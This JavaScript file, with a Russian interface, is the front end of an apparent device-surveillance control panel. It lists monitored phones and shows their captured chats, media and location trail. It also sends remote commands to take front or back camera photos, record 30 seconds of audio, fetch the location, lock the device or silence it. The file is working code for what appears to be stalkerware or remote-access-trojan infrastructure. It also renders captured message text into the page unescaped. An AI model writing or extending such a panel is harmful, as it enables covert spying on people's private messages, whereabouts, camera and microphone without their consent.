const API = location.origin;
let token = sessionStorage.getItem('tok') || '';
let devId = '';
let tab = 'chats';
let ws;
const $ = id => document.getElementById(id);

async function api(path, opt) {
  opt = opt || {};
  opt.headers = Object.assign({ 'X-Admin-Token': token }, opt.headers || {});
  const r = await fetch(API + path, opt);
  if (r.status === 401) { logout(); throw new Error('401'); }
  return r;
}
function logout() { sessionStorage.removeItem('tok'); location.reload(); }

$('go').onclick = async () => {
  const r = await fetch(API + '/api/login', { method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ password: $('pass').value }) });
  if (!r.ok) { $('err').textContent = 'неверный пароль'; return; }
  token = (await r.json()).token;
  sessionStorage.setItem('tok', token);
  start();
};
$('out').onclick = logout;

async function start() {
  $('login').hidden = true; $('app').hidden = false;
  const devs = await (await api('/api/devices')).json();
  $('dev').innerHTML = devs.map(d => `<option value="${d.id}">${d.name}</option>`).join('') || '<option>нет</option>';
  devId = devs[0] ? devs[0].id : '';
  $('dev').onchange = () => { devId = $('dev').value; draw(); };
  $('nav').innerHTML = ['Чаты', 'Медиа', 'Карта', 'Команды'].map((n, i) => `<button data-t="${i}">${n}</button>`).join('');
  document.querySelectorAll('[data-t]').forEach(b => b.onclick = () => { tab = +b.dataset.t; draw(); });
  connectWs(); draw();
}

function connectWs() {
  ws = new WebSocket(API.replace('https', 'wss') + '/ws/panel?token=' + token);
  ws.onmessage = e => {
    const m = JSON.parse(e.data);
    if (m.ping) return;
    if (m.t === 'device') return start();
    if (m.device === devId) draw();
  };
  ws.onclose = () => setTimeout(connectWs, 3000);
}

async function draw() {
  document.querySelectorAll('[data-t]').forEach(b => b.classList.toggle('on', +b.dataset.t === tab));
  const m = $('main');
  if (!devId) { m.innerHTML = '<p class="dim">Устройств нет</p>'; return; }
  const st = await (await api('/api/devices')).json();
  const cur = st.find(d => d.id === devId);
  $('status').textContent = cur && cur.online ? 'онлайн' : 'офлайн';
  $('status').className = 'st ' + (cur && cur.online ? 'on' : 'off');

  if (tab === 0) {
    const rows = await (await api(`/api/devices/${devId}/chats`)).json();
    m.innerHTML = rows.map(r => `<div class="row" data-c="${encodeURIComponent(r.contact)}">
      <div><div class="nm">${r.contact.split('|').pop()}</div>
      <div class="dim">${r.contact.split('|')[0]} · ${r.n}</div></div></div>`).join('') || '<p class="dim">Пусто</p>';
    document.querySelectorAll('[data-c]').forEach(el => el.onclick = () => openChat(decodeURIComponent(el.dataset.c)));
  }
  if (tab === 1) {
    const items = await (await api(`/api/devices/${devId}/media`)).json();
    m.innerHTML = '<div class="grid">' + items.map(i => `<div class="card">
      ${i.kind.indexOf('photo') === 0 ? `<img src="${i.url}" loading="lazy">` : `<video src="${i.url}" controls preload="none"></video>`}
      <div class="m">${i.kind}</div></div>`).join('') + '</div>';
  }
  if (tab === 2) {
    const pts = await (await api(`/api/devices/${devId}/locations`)).json();
    m.innerHTML = '<canvas id="cv"></canvas>';
    const cv = $('cv'), ctx = cv.getContext('2d');
    cv.width = cv.clientWidth; cv.height = 320;
    if (!pts.length) return;
    const co = pts.map(p => p.body.split(',').map(Number)).reverse();
    const xs = co.map(c => c[0]), ys = co.map(c => c[1]);
    const mnX = Math.min.apply(null, xs), mxX = Math.max.apply(null, xs);
    const mnY = Math.min.apply(null, ys), mxY = Math.max.apply(null, ys);
    const px = v => 20 + (v - mnX) / ((mxX - mnX) || 1) * (cv.width - 40);
    const py = v => 20 + (v - mnY) / ((mxY - mnY) || 1) * (cv.height - 40);
    ctx.strokeStyle = '#4da3ff'; ctx.lineWidth = 2; ctx.beginPath();
    co.forEach((c, i) => i ? ctx.lineTo(px(c[0]), py(c[1])) : ctx.moveTo(px(c[0]), py(c[1])));
    ctx.stroke();
    const l = co[co.length - 1];
    ctx.fillStyle = '#4da3ff'; ctx.beginPath(); ctx.arc(px(l[0]), py(l[1]), 5, 0, 7); ctx.fill();
  }
  if (tab === 3) {
    const cmds = [['photo_front', 'Фото фронталка'], ['photo_back', 'Фото тыл'], ['mic30', 'Запись 30 с'],
                  ['loc', 'Геопозиция'], ['lock', 'Заблокировать'], ['silent', 'Тихий режим']];
    m.innerHTML = '<div class="cmds">' + cmds.map(c => `<button data-k="${c[0]}">${c[1]}</button>`).join('') + '</div>';
    document.querySelectorAll('[data-k]').forEach(b => b.onclick = async () => {
      await api(`/api/devices/${devId}/cmd?kind=${b.dataset.k}`, { method: 'POST' });
      b.textContent = 'отправлено'; setTimeout(draw, 1200);
    });
  }
}

async function openChat(contact) {
  const msgs = await (await api(`/api/devices/${devId}/chat?contact=${encodeURIComponent(contact)}`)).json();
  $('main').innerHTML = '<button onclick="draw()">← назад</button>' +
    msgs.map(m => `<div class="bub ${m.src === 'screen' ? 'out' : ''}">${m.body}
      <div class="bt">${new Date(m.ts).toLocaleTimeString('ru-RU')} · ${m.src}</div></div>`).join('');
}
if (token) start();
